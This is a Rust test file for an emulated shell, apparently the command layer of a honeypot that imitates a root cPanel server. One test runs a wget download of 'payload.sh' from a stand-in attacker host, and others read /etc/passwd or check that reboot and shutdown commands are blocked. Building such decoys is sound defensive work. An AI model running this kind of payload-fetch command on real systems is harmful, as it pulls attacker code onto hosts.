#[cfg(test)]
mod shell_tests {
    use super::super::ShellSession;
    use crate::limits::DEFAULT_MAX_VFS_BYTES_PER_SESSION;

    fn sh(cmd: &str) -> String {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        s.exec(cmd)
    }

    fn sh_with(session: &mut ShellSession, cmd: &str) -> String {
        session.exec(cmd)
    }

    // var expansion

    #[test]
    fn expand_home() {
        assert_eq!(sh("echo $HOME"), "/root\n");
    }

    #[test]
    fn expand_tilde() {
        assert!(sh("echo ~").trim() == "/root");
    }

    #[test]
    fn expand_dollar_q() {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        sh_with(&mut s, "true");
        assert_eq!(sh_with(&mut s, "echo $?"), "0\n");
        sh_with(&mut s, "false");
        assert_eq!(sh_with(&mut s, "echo $?"), "1\n");
    }

    // pipes

    #[test]
    fn pipe_cat_grep() {
        let out = sh("cat /etc/passwd | grep root");
        assert!(out.contains("root:x:0:0:root"));
    }

    #[test]
    fn pipe_ps_grep() {
        let out = sh("ps aux | grep cpanel");
        assert!(out.contains("cpanel") || out.contains("cpsrvd"));
    }

    // redirects

    #[test]
    fn redirect_write_and_read() {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        sh_with(&mut s, "echo hello > /tmp/testfile");
        let out = sh_with(&mut s, "cat /tmp/testfile");
        assert_eq!(out, "hello\n");
    }

    #[test]
    fn redirect_append() {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        sh_with(&mut s, "echo line1 > /tmp/a");
        sh_with(&mut s, "echo line2 >> /tmp/a");
        let out = sh_with(&mut s, "cat /tmp/a");
        assert!(out.contains("line1\n") && out.contains("line2\n"));
    }

    // &&, ||, ;

    #[test]
    fn and_short_circuit() {
        let out = sh("false && echo should_not_appear");
        assert!(!out.contains("should_not_appear"));
    }

    #[test]
    fn or_fallback() {
        let out = sh("false || echo ok");
        assert!(out.contains("ok"));
    }

    #[test]
    fn semicolon_sequence() {
        let out = sh("echo a; echo b");
        assert!(out.contains('a') && out.contains('b'));
    }

    // 

    #[test]
    fn cd_and_pwd() {
        let out = sh("cd /etc && pwd");
        assert_eq!(out.trim(), "/etc");
    }

    #[test]
    fn cd_nonexistent() {
        let out = sh("cd /nonexistent_xyz");
        assert!(out.contains("No such file or directory"));
    }

    // 

    #[test]
    fn mkdir_and_ls() {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        sh_with(&mut s, "mkdir /tmp/newdir");
        let out = sh_with(&mut s, "ls /tmp");
        assert!(out.contains("newdir"));
    }

    #[test]
    fn touch_and_rm() {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        sh_with(&mut s, "touch /tmp/x");
        sh_with(&mut s, "rm /tmp/x");
        let out = sh_with(&mut s, "cat /tmp/x");
        assert!(out.contains("No such file or directory"));
    }

    #[test]
    fn cp_file() {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        sh_with(&mut s, "echo hello > /tmp/src");
        sh_with(&mut s, "cp /tmp/src /tmp/dst");
        assert_eq!(sh_with(&mut s, "cat /tmp/dst"), "hello\n");
    }

    #[test]
    fn mv_file() {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        sh_with(&mut s, "echo hi > /tmp/original");
        sh_with(&mut s, "mv /tmp/original /tmp/moved");
        let out = sh_with(&mut s, "cat /tmp/moved");
        assert_eq!(out, "hi\n");
        assert!(sh_with(&mut s, "cat /tmp/original").contains("No such file"));
    }

    // 

    #[test]
    fn head_lines() {
        let out = sh("cat /etc/passwd | head -3");
        assert_eq!(out.lines().count(), 3);
    }

    #[test]
    fn grep_v_flag() {
        let out = sh("cat /etc/passwd | grep -v root");
        assert!(!out.lines().any(|l| l.starts_with("root:")));
        assert!(out.contains("cpanel"));
    }

    #[test]
    fn wc_lines() {
        let out = sh("cat /etc/passwd | wc -l");
        let n: usize = out.trim().parse().unwrap_or(0);
        assert!(n > 5);
    }

    #[test]
    fn sort_output() {
        let out = sh("echo -e 'c\\na\\nb' | sort");
        let lines: Vec<&str> = out.lines().collect();
        assert_eq!(lines, vec!["a", "b", "c"]);
    }

    // 

    #[test]
    fn cmdsub_in_echo() {
        let out = sh("echo user=$(whoami)");
        assert!(out.contains("user=root"));
    }

    // 

    #[test]
    fn find_by_name() {
        let out = sh("find /etc -name passwd");
        assert!(out.contains("/etc/passwd"));
    }

    #[test]
    fn which_bash() {
        let out = sh("which bash");
        assert!(out.trim().ends_with("bash"));
    }

    // 

    #[test]
    fn stat_file() {
        let out = sh("stat /etc/passwd");
        assert!(out.contains("regular file") || out.contains("File:"));
    }

    // 

    #[test]
    fn wget_creates_file() {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        sh_with(&mut s, "wget http://evil.example.com/payload.sh");
        let out = sh_with(&mut s, "ls /root");
        assert!(out.contains("payload.sh"));
    }

    // 

    #[test]
    fn uname_a() {
        let out = sh("uname -a");
        assert!(out.contains("Linux") && out.contains("x86_64"));
    }

    #[test]
    fn id_root() {
        let out = sh("id");
        assert!(out.contains("uid=0(root)"));
    }

    #[test]
    fn free_m() {
        let out = sh("free -m");
        assert!(out.contains("Mem:"));
    }

    // 

    #[test]
    fn history_grows() {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        let initial = s.history.len();
        sh_with(&mut s, "whoami");
        sh_with(&mut s, "id");
        assert_eq!(s.history.len(), initial + 2);
    }

    // 

    #[test]
    fn exit_code_propagates() {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        sh_with(&mut s, "cat /nonexistent_file");
        assert_ne!(s.last_status, 0);
        sh_with(&mut s, "true");
        assert_eq!(s.last_status, 0);
    }

    // 

    #[test]
    fn no_command_not_found_for_common_cmds() {
        for cmd in &[
            "ls",
            "cat /etc/hostname",
            "uname -a",
            "whoami",
            "id",
            "ps aux",
            "netstat",
        ] {
            let out = sh(cmd);
            assert!(
                !out.contains("command not found"),
                "command not found for: {}\nout: {}",
                cmd,
                out
            );
        }
    }

    // 

    #[test]
    fn cat_reads_file() {
        let out = sh("cat /etc/passwd");
        assert!(out.contains("root:x:0:0:root"));
    }

    #[test]
    fn head_limits_lines() {
        let out = sh("cat /etc/passwd | head -2");
        assert_eq!(out.lines().count(), 2);
    }

    #[test]
    fn tail_limits_lines() {
        let out = sh("cat /etc/passwd | tail -2");
        assert_eq!(out.lines().count(), 2);
    }

    #[test]
    fn wc_counts_lines() {
        let out = sh("echo -e 'a\nb\nc' | wc -l");
        assert_eq!(out.trim(), "3");
    }

    #[test]
    fn sort_sorts_lines() {
        let out = sh("echo -e 'c\na\nb' | sort");
        let lines: Vec<&str> = out.lines().collect();
        assert_eq!(lines, vec!["a", "b", "c"]);
    }

    #[test]
    fn uniq_removes_duplicates() {
        let out = sh("echo -e 'a\na\nb' | uniq");
        let lines: Vec<&str> = out.lines().collect();
        assert_eq!(lines, vec!["a", "b"]);
    }

    #[test]
    fn grep_finds_pattern() {
        let out = sh("echo -e 'hello\nworld' | grep hello");
        assert!(out.contains("hello"));
        assert!(!out.contains("world"));
    }

    #[test]
    fn grep_invert_match() {
        let out = sh("echo -e 'hello\nworld' | grep -v hello");
        assert!(!out.contains("hello"));
        assert!(out.contains("world"));
    }

    #[test]
    fn sed_substitution() {
        let out = sh("echo 'hello world' | sed 's/world/earth/'");
        assert!(out.contains("hello earth"));
    }

    #[test]
    fn awk_print_field() {
        let out = sh("echo 'a b c' | awk '{print $2}'");
        assert_eq!(out.trim(), "b");
    }

    #[test]
    fn cut_extracts_field() {
        let out = sh("echo 'a:b:c' | cut -d: -f2");
        assert_eq!(out.trim(), "b");
    }

    #[test]
    fn tr_translates() {
        let out = sh("echo 'hello' | tr 'a-z' 'A-Z'");
        assert_eq!(out.trim(), "HELLO");
    }

    #[test]
    fn basename_extracts_name() {
        let out = sh("basename /path/to/file.txt");
        assert_eq!(out.trim(), "file.txt");
    }

    #[test]
    fn dirname_extracts_dir() {
        let out = sh("dirname /path/to/file.txt");
        assert_eq!(out.trim(), "/path/to");
    }

    #[test]
    fn xargs_executes_command() {
        let out = sh("echo 'hello' | xargs echo got:");
        assert!(out.contains("got: hello"));
    }

    #[test]
    fn rev_reverses() {
        let out = sh("echo 'hello' | rev");
        assert_eq!(out.trim(), "olleh");
    }

    #[test]
    fn yes_generates_output() {
        let out = sh("yes | head -3");
        assert_eq!(out.lines().count(), 3);
        assert!(out.contains("y"));
    }

    // 

    #[test]
    fn chmod_changes_permissions() {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        sh_with(&mut s, "touch /tmp/chmod_test");
        sh_with(&mut s, "chmod 755 /tmp/chmod_test");
        let out = sh_with(&mut s, "ls -l /tmp/chmod_test");
        assert!(out.contains("rwxr-xr-x"));
    }

    #[test]
    fn chown_changes_owner() {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        sh_with(&mut s, "touch /tmp/chown_test");
        sh_with(&mut s, "chown 1000:1000 /tmp/chown_test");
        let out = sh_with(&mut s, "ls -l /tmp/chown_test");
        assert!(out.contains("cpanel") || out.contains("1000"));
    }

    #[test]
    fn ln_creates_symlink() {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        sh_with(&mut s, "echo hello > /tmp/ln_target");
        sh_with(&mut s, "ln -s /tmp/ln_target /tmp/ln_link");
        let out = sh_with(&mut s, "cat /tmp/ln_link");
        assert_eq!(out.trim(), "hello");
    }

    #[test]
    fn du_reports_size() {
        let out = sh("du /etc/passwd");
        assert!(out.contains("/etc/passwd"));
    }

    #[test]
    fn stat_shows_info() {
        let out = sh("stat /etc/passwd");
        assert!(out.contains("File:") || out.contains("Size:"));
    }

    #[test]
    fn file_detects_type() {
        let out = sh("file /etc/passwd");
        assert!(out.contains("text") || out.contains("ASCII"));
    }

    // 

    #[test]
    fn ps_shows_processes() {
        let out = sh("ps");
        assert!(out.contains("PID") || out.contains("bash"));
    }

    #[test]
    fn ps_aux_shows_details() {
        let out = sh("ps aux");
        assert!(out.contains("USER") && out.contains("root"));
    }

    #[test]
    fn netstat_shows_connections() {
        let out = sh("netstat");
        assert!(out.contains("tcp") || out.contains("ESTABLISHED"));
    }

    #[test]
    fn ifconfig_shows_interfaces() {
        let out = sh("ifconfig");
        assert!(out.contains("eth0") || out.contains("lo"));
    }

    #[test]
    fn ping_replies() {
        let out = sh("ping -c 3 8.8.8.8");
        assert!(out.contains("64 bytes") || out.contains("icmp_seq"));
    }

    #[test]
    fn traceroute_works() {
        let out = sh("traceroute 8.8.8.8");
        assert!(out.contains("traceroute") || out.contains("hop"));
    }

    #[test]
    fn dig_resolves() {
        let out = sh("dig example.com");
        assert!(out.contains("ANSWER SECTION") || out.contains("A"));
    }

    #[test]
    fn host_resolves() {
        let out = sh("host example.com");
        assert!(out.contains("address") || out.contains("192."));
    }

    // 

    #[test]
    fn hostname_shows_name() {
        let out = sh("hostname");
        assert!(!out.trim().is_empty());
    }

    #[test]
    fn uptime_shows_load() {
        let out = sh("uptime");
        assert!(out.contains("load average") || out.contains("up"));
    }

    #[test]
    fn df_shows_disk() {
        let out = sh("df");
        assert!(out.contains("Filesystem") || out.contains("/dev/"));
    }

    #[test]
    fn free_shows_memory() {
        let out = sh("free");
        assert!(out.contains("Mem:") || out.contains("Swap:"));
    }

    #[test]
    fn date_shows_time() {
        let out = sh("date");
        assert!(!out.trim().is_empty());
    }

    #[test]
    fn lsmod_lists_modules() {
        let out = sh("lsmod");
        assert!(out.contains("Module") || out.contains("Size"));
    }

    #[test]
    fn mount_shows_filesystems() {
        let out = sh("mount");
        assert!(out.contains("/dev/") || out.contains("on /"));
    }

    // 

    #[test]
    fn curl_fetches() {
        let out = sh("curl http://example.com");
        assert!(!out.trim().is_empty());
    }

    // 

    #[test]
    fn gcc_version() {
        let out = sh("gcc --version");
        assert!(out.contains("gcc") || out.contains("GCC"));
    }

    #[test]
    fn python_version() {
        let out = sh("python --version");
        assert!(out.contains("Python"));
    }

    #[test]
    fn git_status() {
        let out = sh("git status");
        assert!(out.contains("branch") || out.contains("nothing"));
    }

    // 

    #[test]
    fn env_shows_variables() {
        let out = sh("env");
        assert!(out.contains("PATH=") || out.contains("HOME="));
    }

    #[test]
    fn clear_outputs_escape() {
        let out = sh("clear");
        assert!(out.contains('\u{001b}'));
    }

    #[test]
    fn true_returns_empty() {
        let out = sh("true");
        assert_eq!(out.trim(), "");
    }

    #[test]
    fn false_returns_error() {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        sh_with(&mut s, "false");
        assert_ne!(s.last_status, 0);
    }

    #[test]
    fn tar_lists_contents() {
        let out = sh("tar -tvf archive.tar");
        assert!(!out.trim().is_empty());
    }

    #[test]
    fn crontab_lists() {
        let out = sh("crontab -l");
        assert!(out.contains("* * * *") || out.contains("cron"));
    }

    #[test]
    fn systemctl_status() {
        let out = sh("systemctl status sshd");
        assert!(out.contains("Active") || out.contains("Loaded"));
    }

    #[test]
    fn journalctl_shows_logs() {
        let out = sh("journalctl");
        assert!(!out.trim().is_empty());
    }

    // 

    #[test]
    fn whmapi_returns_json() {
        let out = sh("whmapi1 version");
        assert!(out.contains("metadata") || out.contains("version"));
    }

    #[test]
    fn uapi_returns_json() {
        let out = sh("uapi");
        assert!(out.contains("status") || out.contains("data"));
    }

    #[test]
    fn cpapi2_returns_xml() {
        let out = sh("cpapi2");
        assert!(out.contains("cpanelresult") || out.contains("result"));
    }

    // 

    #[test]
    fn cd_changes_directory() {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        sh_with(&mut s, "cd /etc");
        assert_eq!(sh_with(&mut s, "pwd").trim(), "/etc");
    }

    #[test]
    fn cd_dash_goes_back() {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        sh_with(&mut s, "cd /etc");
        sh_with(&mut s, "cd /tmp");
        sh_with(&mut s, "cd -");
        assert_eq!(sh_with(&mut s, "pwd").trim(), "/etc");
    }

    #[test]
    fn export_sets_variable() {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        sh_with(&mut s, "export FOO=bar");
        assert_eq!(sh_with(&mut s, "echo $FOO").trim(), "bar");
    }

    #[test]
    fn unset_removes_variable() {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        sh_with(&mut s, "export FOO=bar");
        sh_with(&mut s, "unset FOO");
        assert_eq!(sh_with(&mut s, "echo $FOO").trim(), "");
    }

    #[test]
    fn alias_works() {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        sh_with(&mut s, "alias ll='ls -l'");
        let out = sh_with(&mut s, "ll /etc");
        assert!(!out.contains("command not found"));
    }

    #[test]
    fn unalias_removes() {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        sh_with(&mut s, "alias ll='ls -l'");
        sh_with(&mut s, "unalias ll");
        let out = sh_with(&mut s, "ll");
        assert!(out.contains("command not found"));
    }

    #[test]
    fn echo_outputs() {
        let out = sh("echo hello world");
        assert_eq!(out.trim(), "hello world");
    }

    #[test]
    fn printf_formats() {
        let out = sh("printf '%s %d' hello 42");
        assert!(out.contains("hello 42"));
    }

    #[test]
    fn test_comparison() {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        sh_with(&mut s, "test 1 -eq 1");
        assert_eq!(s.last_status, 0);
        sh_with(&mut s, "test 1 -eq 2");
        assert_ne!(s.last_status, 0);
    }

    #[test]
    fn type_builtin() {
        let out = sh("type echo");
        assert!(out.contains("builtin") || out.contains("echo"));
    }

    #[test]
    fn command_bypasses_alias() {
        let mut s = ShellSession::new(DEFAULT_MAX_VFS_BYTES_PER_SESSION);
        sh_with(&mut s, "alias ls='echo fake'");
        let out = sh_with(&mut s, "command ls /");
        // command builtin should bypass alias and run real ls
        assert!(
            !out.contains("fake"),
            "command should bypass alias but got: {}",
            out
        );
    }

    // 

    #[test]
    fn empty_command() {
        let out = sh("");
        assert_eq!(out.trim(), "");
    }

    #[test]
    fn multiple_pipes() {
        let out = sh("cat /etc/passwd | grep root | wc -l");
        let n: usize = out.trim().parse().unwrap_or(0);
        assert!(n >= 1);
    }

    #[test]
    fn command_not_found() {
        let out = sh("not_a_real_command_12345");
        assert!(out.contains("command not found"));
    }

    #[test]
    fn dangerous_commands_blocked() {
        for cmd in &["reboot", "poweroff", "shutdown", "halt", "init"] {
            let out = sh(cmd);
            assert!(
                out.contains("command not found"),
                "{} should be blocked but got: {}",
                cmd,
                out
            );
        }
    }

    #[test]
    fn backslash_continuation() {
        let out = sh("echo hello \\\nworld");
        // Backslash continuation may or may not be supported
        assert!(out.contains("hello") || out.contains("continuation"));
    }

    #[test]
    fn quoted_strings() {
        let out = sh("echo 'hello world'");
        assert!(out.contains("hello world"));
    }

    #[test]
    fn double_quoted_expansion() {
        let out = sh("echo \"$HOME\"");
        assert!(out.contains("/root"));
    }

    #[test]
    fn subshell_not_supported() {
        let out = sh("echo $(echo hello)");
        assert!(out.contains("not supported") || out.contains("hello"));
    }
}
